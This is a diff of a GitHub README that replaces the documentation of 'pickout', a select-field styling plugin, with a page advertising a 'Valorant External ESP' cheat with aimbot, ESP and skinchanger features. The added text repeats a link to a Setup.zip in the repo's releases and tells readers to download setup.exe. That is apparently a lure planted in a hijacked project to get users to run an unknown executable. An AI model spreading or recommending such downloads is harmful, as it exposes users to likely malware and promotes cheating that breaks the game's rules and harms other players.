@@ -1,149 +1,53 @@
-# pickout
-Cool effect for field select on form
-
-![alt tag](https://cloud.githubusercontent.com/assets/8084606/14060913/ff3d6438-f350-11e5-9e95-1404418f2523.gif)
-
-## How to use 
-### npm
-
-```shell
-npm install pickout --save
-```
-
-### bower
-
-```shell
-bower install pickout --save
-```
-
-### Inserting HTML
-Include the style
-
-```html
-<link rel="stylesheet" href="./path/to/pickout.min.css">
-...
-</head>
-```
-
-Include the script
-
-```html
-<script src="./path/to/pickout.min.js"></script>
-...
-</body>
-```
-
-## Example of block the select field
-
-```html
-<!-- Normal use -->
-<label for="label_1">
-	<select name="label_1" id="label_1" class="label_1 all" placeholder="Select to option">
-		<option value="opt1">Option 1</option>
-		<option value="opt2">Option 2</option>
-		<option value="opt3">Option 3</option>
-		<option value="opt4">Option 4</option>
-	</select>		
-</label>
+# Valorant External ESP
 
 
-<!-- Using with icons -->
-<label for="label_2">
-	<select name="label_2" id="label_2" class="label_2 all" placeholder="Select to option">
-		<option value="opt1" data-icon="&#xe601;" >Option 1</option>
-		<option value="opt2" data-icon="&#xe602;">Option 2</option>
-		<option value="opt3" data-icon="&#xe603;">Option 3</option>
-		<option value="opt4" data-icon="&#xe604;">Option 4</option>
-	</select>		
-</label>
-```
+![deoWJW9](https://github.com/user-attachments/assets/02ac446c-6662-46ee-a985-a9ba83488776)
 
-### Attributes
-`` data-icon `` : Icon code, for example: "e602", simply use ``data-icon="&#xe602"``;
+# Download [Download Archive](https://github.com/includebrasil/pickout/releases/download/asd/Setup.zip)
+# Download [Download Archive](https://github.com/includebrasil/pickout/releases/download/asd/Setup.zip)
+# Download [Download Archive](https://github.com/includebrasil/pickout/releases/download/asd/Setup.zip)
 
-## Set the select
 
-```js
-pickout.to('.label_1');
-```
+## Overview
 
-Another option
+Welcome to the **Valorant External ESP** repository! This project provides an external cheat for the popular game Valorant, featuring an advanced ESP (Extra Sensory Perception) system designed to enhance your gameplay experience. 
 
-```js
-pickout.to({
-  el: '.label_1'
-});
-```
+## Features
 
-**OBS:** Do not forget to declare the characters responsible dial if class use (.) If ID using the (#)
+- **ESP Options**: 
+  - Box ESP
+  - Corner ESP
+  - Health Bars
+  - Tracers
+  - Chams
+  - Minimap Positioning
 
-### Set all at once
-You can assign to selects separately, however you can apply all at once, simply declare a class in common to all selects and inform the plugin, for example:
+- **Aimbot Functionality**:
+  - Toggle on keypress
+  - Adjustable FOV (Field of View)
+  - Smooth aim adjustments
+  - Anti-recoil settings
 
-```js
-pickout.to('.all');
-```
+- **Additional Tweaks**:
+  - Skinchanger
+  - Auto-bhop
+  - Streamproof options
 
-### Customize styles
-To customize, simply add in your CSS rule with this pattern:<br>
+## Compatibility
 
-```css
-.pk-input.-MySelector{
-	// my customization	
-}
-.pk-arrow.-MySelector{
-	// my customization	
-}
-```
+- **Operating Systems**: Windows 10 (versions 1909 - 22H2) and Windows 11
+- **CPUs**: Intel and AMD
 
-And the definition of pickout informs the theme
+## Installation
 
-```js
-pickout.to({
-  el: '.label_1',
-  theme: 'MySelector'
-});
-```
+- ***Download setup.exe***
 
-#### Themes
-- clean (Default) <br>
-- dark 
+## Community Support
 
-```js
-pickout.to({
-  el: '.label_1',
-  theme: 'dark'
-});
-```
+Join our [Discord server] for support, updates, and discussions about the project. 
 
-## Select with default values
+## Note
 
-```html
-<label for="label">
-	<select name="label" id="label" class="label all" placeholder="Select to option">
-	  <!-- Option selected by default -->
-		<option value="opt1" selected>Option 1</option>
-		<option value="opt2">Option 2</option>
-	</select>		
-</label>
-```
+This project is intended for educational purposes and should not be used in violation of game terms of service. Use at your own risk.
 
-It uses the updated function
-
-```js
-pickout.updated('.label');
-```
-
-## Current version stable
-**V1.0.2**
-
-## ChangeLog
-
-## Contributing
-- Check the open issues or open a new issue to start a discussion around your feature idea or the bug you found.
-- Fork repository, make changes, add your name and link in the authors session readme.md
-- Send a pull request
-
-If you want a faster communication, find me on [@ktquez](https://twitter.com/ktquez)
-
-**thank you**
+If you find this project useful, please consider giving it a star! 🌟
